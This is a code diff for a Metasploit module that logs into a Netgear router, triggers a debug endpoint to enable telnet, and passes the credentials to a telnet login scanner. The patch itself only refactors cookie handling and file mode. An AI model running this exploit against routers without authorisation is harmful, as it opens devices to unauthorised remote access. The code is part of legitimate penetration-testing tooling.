@@ -176,26 +176,26 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Attempting to retrieve /top.html to verify we are logged in!')
 
     print_status('Sending one request to grab authorization cookie from headers...')
+    cookie_jar.clear
     res = send_request_cgi(
       'uri' => '/top.html',
-      'method' => 'GET'
+      'method' => 'GET',
+      'keep_cookies' => 'true'
     )
 
     if res.nil?
       fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
     end
 
-    unless res.headers['Set-Cookie']
+    if cookie_jar.empty?
       fail_with(Failure::UnexpectedReply, "Router didn't respond with the expected Set-Cookie header to a response to /top.html!")
     end
-    auth_cookie = res.headers['Set-Cookie']
 
     print_status('Got the authentication cookie, associating it with a logged in session...')
     res = send_request_cgi(
       'uri' => '/top.html',
       'method' => 'GET',
-      'authorization' => basic_auth(username, password),
-      'cookie' => auth_cookie
+      'authorization' => basic_auth(username, password)
     )
 
     if res.nil?
@@ -246,8 +246,7 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get' => {
         'todo' => 'debug'
       },
-      'authorization' => basic_auth(username, password),
-      'cookie' => auth_cookie
+      'authorization' => basic_auth(username, password)
     )
 
     if res.nil?
@@ -260,7 +259,7 @@ class MetasploitModule < Msf::Auxiliary
     print_good('Telnet enabled on target router!')
     handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')
     handler.datastore['RHOSTS'] = datastore['RHOST']
-    file_handle = File.open('netgear_pnpx_wordlist.txt', 'w')
+    file_handle = File.open('netgear_pnpx_wordlist.txt', 'wb')
     file_handle.write("#{username} #{password}")
     file_handle.close
     handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
